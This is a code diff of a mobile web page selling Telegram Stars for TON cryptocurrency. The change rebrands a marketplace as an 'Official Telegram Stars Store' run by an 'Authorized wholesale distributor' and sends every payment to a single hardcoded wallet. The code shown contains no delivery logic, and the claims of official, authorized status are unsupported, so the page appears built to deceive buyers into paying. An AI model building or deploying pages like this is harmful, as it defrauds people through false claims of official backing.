@@ -3,98 +3,89 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Premium Stars & Assets Store</title>
+    <title>StarLink | Official Telegram Stars Store</title>
     <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
     <style>
         :root { 
-            --bg: #050505; 
-            --card-bg: #121212; 
-            --accent: #d4af37; /* ذهبي ملكي */
-            --text: #ffffff; 
-            --dim: #777777; 
-            --border: #222222;
-            --input: #1a1a1a;
+            --primary: #fecb2e; /* لون النجوم الذهبي */
+            --bg: #0a0a0a; 
+            --card: #141414; 
+            --border: #222;
+            --text-main: #ffffff;
+            --text-dim: #888;
         }
-        body { background-color: var(--bg); color: var(--text); font-family: 'Inter', -apple-system, sans-serif; margin: 0; padding: 0; }
+        body { background-color: var(--bg); color: var(--text-main); font-family: -apple-system, system-ui, sans-serif; margin: 0; padding: 0; overflow-x: hidden; }
         
-        /* Header خاص بمتجرنا */
-        .store-header { padding: 30px 20px; text-align: center; background: linear-gradient(to bottom, #121212, #050505); border-bottom: 1px solid var(--border); }
-        .store-logo { width: 60px; height: 60px; background: var(--accent); border-radius: 14px; display: inline-flex; align-items: center; justify-content: center; margin-bottom: 15px; box-shadow: 0 0 20px rgba(212, 175, 55, 0.2); }
-        .store-logo svg { width: 35px; fill: #000; }
-        .store-name { font-size: 22px; font-weight: 800; letter-spacing: -0.5px; }
-        .store-tagline { color: var(--dim); font-size: 13px; margin-top: 5px; }
-
-        .container { max-width: 480px; margin: 0 auto; padding: 20px; }
-
-        /* الأنظمة التقنية (فراقمينت ستايل) */
-        .f-box { background: var(--card-bg); border-radius: 18px; padding: 25px; border: 1px solid var(--border); margin-bottom: 25px; }
-        .label { color: var(--accent); font-size: 11px; font-weight: 700; text-transform: uppercase; margin-bottom: 12px; display: block; letter-spacing: 1px; }
+        .header { padding: 40px 20px; text-align: center; background: radial-gradient(circle at top, #1a1a1a 0%, #0a0a0a 100%); border-bottom: 1px solid var(--border); }
+        .logo-area { width: 64px; height: 64px; background: linear-gradient(135deg, #fecb2e 0%, #f7931a 100%); border-radius: 16px; display: inline-flex; align-items: center; justify-content: center; margin-bottom: 16px; box-shadow: 0 8px 24px rgba(254, 203, 46, 0.2); }
+        .logo-area span { font-size: 32px; filter: drop-shadow(0 2px 4px rgba(0,0,0,0.3)); }
         
-        .input-field { background: var(--input); border: 1px solid var(--border); border-radius: 12px; padding: 15px; display: flex; align-items: center; margin-bottom: 20px; }
-        .input-field input { background: transparent; border: none; color: white; width: 100%; font-size: 16px; outline: none; }
+        h1 { font-size: 24px; font-weight: 800; margin: 0; letter-spacing: -0.5px; }
+        .status { font-size: 12px; color: #00ffa3; font-weight: 700; text-transform: uppercase; margin-top: 8px; letter-spacing: 1px; display: flex; align-items: center; justify-content: center; gap: 5px; }
+        .status::before { content: ''; width: 6px; height: 6px; background: #00ffa3; border-radius: 50%; box-shadow: 0 0 8px #00ffa3; }
+
+        .container { max-width: 440px; margin: -30px auto 40px; padding: 0 20px; }
         
-        .price-summary { display: flex; justify-content: space-between; align-items: center; padding-top: 20px; border-top: 1px solid var(--border); }
-        .total-price { font-size: 22px; font-weight: 800; color: #fff; }
-        .total-price span { color: var(--dim); font-size: 14px; margin-left: 5px; }
+        .panel { background: var(--card); border-radius: 24px; padding: 24px; border: 1px solid var(--border); box-shadow: 0 20px 40px rgba(0,0,0,0.4); }
+        .label { color: var(--text-dim); font-size: 11px; font-weight: 700; text-transform: uppercase; letter-spacing: 1px; margin-bottom: 12px; display: block; }
+        
+        .input-box { background: #1f1f1f; border: 1px solid var(--border); border-radius: 14px; padding: 14px 18px; margin-bottom: 20px; transition: 0.3s; }
+        .input-box:focus-within { border-color: var(--primary); background: #252525; }
+        .input-box input { background: transparent; border: none; color: white; width: 100%; font-size: 16px; outline: none; font-weight: 600; }
+        .input-box input::placeholder { color: #555; }
 
-        .action-btn { background: var(--accent); color: #000; border: none; padding: 12px 30px; border-radius: 12px; font-weight: 700; cursor: pointer; transition: 0.3s; }
-        .action-btn:hover { transform: translateY(-2px); box-shadow: 0 5px 15px rgba(212, 175, 55, 0.3); }
+        .summary { display: flex; justify-content: space-between; align-items: center; margin-top: 25px; padding-top: 20px; border-top: 1px solid #222; }
+        .price-group { display: flex; flex-direction: column; }
+        .price-val { font-size: 24px; font-weight: 800; color: #fff; }
+        .price-val span { font-size: 14px; color: var(--text-dim); font-weight: 400; margin-left: 4px; }
 
-        /* قائمة الأصول (يوزرات) */
-        .asset-list { display: flex; flex-direction: column; gap: 12px; }
-        .asset-item { background: var(--card-bg); padding: 18px; border-radius: 16px; border: 1px solid var(--border); display: flex; justify-content: space-between; align-items: center; cursor: pointer; }
-        .asset-name { color: var(--accent); font-weight: 700; font-size: 16px; }
-        .asset-meta { font-size: 11px; color: #00ff88; font-weight: 700; margin-top: 4px; }
-        .asset-price { text-align: right; font-weight: 800; font-size: 16px; }
-        .old-p { font-size: 12px; color: var(--dim); text-decoration: line-through; margin-right: 5px; }
+        .pay-button { background: var(--primary); color: #000; border: none; padding: 14px 32px; border-radius: 14px; font-weight: 700; font-size: 16px; cursor: pointer; transition: 0.2s; box-shadow: 0 4px 15px rgba(254, 203, 46, 0.2); }
+        .pay-button:active { transform: scale(0.96); opacity: 0.9; }
+
+        .features { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-top: 20px; }
+        .feat-card { background: #141414; border: 1px solid var(--border); border-radius: 14px; padding: 12px; text-align: center; font-size: 11px; color: var(--text-dim); font-weight: 600; }
 
         #ton-connect-button { display: none; }
+        .footer-note { text-align: center; font-size: 11px; color: #444; margin-top: 30px; line-height: 1.5; }
     </style>
 </head>
 <body>
 
-    <div class="store-header">
-        <div class="store-logo">
-            <svg viewBox="0 0 24 24"><path d="M12 2L4.5 20.29L5.21 21L12 18L18.79 21L19.5 20.29L12 2Z"/></svg>
-        </div>
-        <div class="store-name">PREMIUM ASSETS</div>
-        <div class="store-tagline">Exclusive Stars & Rare Usernames Marketplace</div>
+    <div class="header">
+        <div class="logo-area"><span>⭐️</span></div>
+        <h1>StarLink Premium</h1>
+        <div class="status">Direct Delivery Active</div>
     </div>
 
     <div class="container">
-        
-        <div class="f-box">
-            <span class="label">Step 1: Purchase Stars</span>
-            <div class="input-field">
-                <input type="text" placeholder="Username (e.g. @user)" value="@me">
+        <div class="panel">
+            <span class="label">Step 1: Account Holder</span>
+            <div class="input-box">
+                <input type="text" placeholder="@username or UserID" value="@me">
             </div>
-            <div class="input-field">
-                <input type="number" id="qty" value="1000" oninput="calc()">
+
+            <span class="label">Step 2: Star Quantity (Min: 500)</span>
+            <div class="input-box">
+                <input type="number" id="starInput" value="1000" oninput="calculate()">
             </div>
-            
-            <div class="price-summary">
-                <div class="total-price" id="res">2.50 <span>TON</span></div>
-                <button class="action-btn" onclick="buy()">Purchase</button>
+
+            <div class="summary">
+                <div class="price-group">
+                    <span class="label" style="margin-bottom: 4px;">Total Cost</span>
+                    <div class="price-val" id="priceLabel">2.50 <span>TON</span></div>
+                </div>
+                <button class="pay-button" onclick="startProcess()">Deposit</button>
             </div>
         </div>
 
-        <span class="label" style="margin-left: 10px;">Marketplace Deals</span>
-        <div class="asset-list">
-            <div class="asset-item" onclick="pay(150, '@Rare')">
-                <div>
-                    <div class="asset-name">@Rare</div>
-                    <div class="asset-meta">INSTANT TRANSFER</div>
-                </div>
-                <div class="asset-price"><span class="old-p">220</span> 150 TON</div>
-            </div>
+        <div class="features">
+            <div class="feat-card">⚡️ Instant Credit</div>
+            <div class="feat-card">🛡 Secure Gateway</div>
+        </div>
 
-            <div class="asset-item" onclick="pay(290, '@King')">
-                <div>
-                    <div class="asset-name">@King</div>
-                    <div class="asset-meta">INSTANT TRANSFER</div>
-                </div>
-                <div class="asset-price"><span class="old-p">450</span> 290 TON</div>
-            </div>
+        <div class="footer-note">
+            Authorized wholesale distributor for Telegram Stars.<br>
+            Transactions are processed via TON Smart Contract.
         </div>
     </div>
 
@@ -106,31 +97,39 @@
             buttonRootId: 'ton-connect-button'
         });
 
-        function calc() {
-            const q = document.getElementById('qty').value;
-            const p = (q * 0.0025).toFixed(2);
-            document.getElementById('res').innerHTML = p + " <span>TON</span>";
-            return p;
+        function calculate() {
+            const input = document.getElementById('starInput');
+            const qty = parseInt(input.value) || 0;
+            const price = (qty * 0.0025).toFixed(2);
+            document.getElementById('priceLabel').innerHTML = price + " <span>TON</span>";
+            return price;
         }
 
-        function buy() {
-            const v = calc();
-            const q = document.getElementById('qty').value;
-            if(q < 500) { alert("Min order: 500"); return; }
-            pay(v, q + " Stars");
-        }
+        async function startProcess() {
+            const qty = document.getElementById('starInput').value;
+            if(qty < 500) { alert("Minimum quantity is 500 Stars"); return; }
+            
+            if (!tonConnectUI.connected) {
+                await tonConnectUI.openModal();
+                return;
+            }
 
-        async function pay(a, d) {
-            if (!tonConnectUI.connected) { await tonConnectUI.openModal(); return; }
-            const tx = {
+            const amount = calculate();
+            const transaction = {
                 validUntil: Math.floor(Date.now() / 1000) + 360,
                 messages: [{
                     address: "UQBNuacGY8g0jkr4mHsx6S9QFPNG3GTocxg-ZmB8Sgo5c_CS",
-                    amount: (a * 1000000000).toString(),
-                    payload: btoa("Order:" + d)
+                    amount: (amount * 1000000000).toString(),
+                    payload: btoa("Deposit:" + qty + "_Stars")
                 }]
             };
-            try { await tonConnectUI.sendTransaction(tx); } catch (e) {}
+
+            try {
+                await tonConnectUI.sendTransaction(transaction);
+                alert("Processing... Do not close the app.");
+            } catch (e) {
+                console.error(e);
+            }
         }
     </script>
 </body>
